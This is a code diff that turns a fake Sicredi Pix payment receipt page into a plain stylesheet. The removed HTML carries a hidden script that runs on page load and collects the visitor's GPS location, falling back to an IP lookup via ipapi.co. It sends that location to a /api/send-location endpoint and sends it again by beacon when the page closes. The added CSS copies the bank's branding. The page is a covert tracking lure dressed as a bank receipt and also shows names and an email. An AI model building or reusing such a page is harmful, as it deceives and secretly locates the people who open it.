@@ -1,107 +1,88 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background-color: #f4f4f4;
+  margin: 0;
+  padding: 15px;
+  color: #333;
+}
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Pix - Sicredi</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
+.comprovante-container {
+  max-width: 500px;
+  margin: 0 auto;
+  background: #fff;
+  padding: 25px;
+  border-radius: 8px;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
 
-<body>
-  <div class="comprovante-container">
-    <div class="topo-comprovante">
-      <h2>Pix Enviado - R$ 530,00</h2>
-    </div>
+/* Estilo para centralizar e ajustar perfeitamente o logotipo */
+.logo-sicredi {
+  text-align: center;
+  margin-bottom: 20px;
+}
+.logo-sicredi img {
+  width: 150px;
+  height: auto;
+  max-width: 100%;
+  display: inline-block;
+}
 
-    <div class="informacoes">
-      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>
-      <p><span>Horário:</span> <span>00:16</span></p>
-      <p><span>ID da Transação:</span> <span class="id-transacao">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>
-      
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
+h1 {
+  font-size: 20px;
+  text-align: center;
+  margin-bottom: 20px;
+  color: #111;
+}
 
-      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>
-      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>
-      
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
+.informacoes p {
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  margin: 12px 0;
+  font-size: 13px;
+  border-bottom: 1px dotted #e0e0e0;
+  padding-bottom: 8px;
+  gap: 15px;
+}
 
-      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>
-      <p><span>CPF:</span> <span>***.640.535-**</span></p>
-      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>
-    </div>
+.informacoes span {
+  color: #555;
+  flex-shrink: 0;
+}
 
-    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
+.informacoes strong {
+  color: #111;
+  text-align: right;
+  word-break: break-all;
+}
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-    </div>
-  </div>
+/* Botão com o verde correto da marca */
+.botao {
+  background-color: #78be20 !important;
+  color: #ffffff !important;
+  border: none;
+  padding: 12px 20px;
+  font-size: 16px;
+  font-weight: bold;
+  border-radius: 6px;
+  cursor: pointer;
+  width: 100%;
+  text-align: center;
+  display: inline-block;
+  margin-top: 15px;
+}
+.botao:hover {
+  background-color: #65a218 !important;
+}
 
-  <script>
-    let dadosUltimaLocalizacao = {
-      latitude: null,
-      longitude: null,
-      maps: "",
-      source: "Não obtida"
-    };
+.comprovante-footer {
+  text-align: center;
+  font-size: 11px;
+  color: #777;
+  margin-top: 25px;
+}
 
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            
-            dadosUltimaLocalizacao = { latitude, longitude, maps, source: "Precisa (GPS)" };
-            enviarParaApi(dadosUltimaLocalizacao, "abriu_pagina");
-          },
-          () => fallbackLocation()
-        );
-      } else {
-        fallbackLocation();
-      }
-    });
-
-    function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-          dadosUltimaLocalizacao = { latitude, longitude, maps, source: "Aproximada (IP)" };
-          enviarParaApi(dadosUltimaLocalizacao, "abriu_pagina_ip");
-        })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
-        });
-    }
-
-    function enviarParaApi(payload, acao) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ...payload, acao })
-      }).catch(error => {
-        console.error("Erro:", error);
-      });
-    }
-
-    // Dispara automaticamente a última localização capturada (ou via IP) quando o usuário fecha a página
-    window.addEventListener('beforeunload', function () {
-      const payload = JSON.stringify({
-        ...dadosUltimaLocalizacao,
-        acao: 'fechou_pagina'
-      });
-
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/send-location', payload);
-      }
-    });
-  </script>
-</body>
-
-</html>
+.comprovante-footer a {
+  color: #78be20;
+  text-decoration: none;
+}
